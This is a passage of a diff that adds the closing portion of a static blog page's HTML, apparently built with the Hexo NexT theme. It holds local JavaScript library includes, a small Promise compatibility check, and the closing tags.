+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
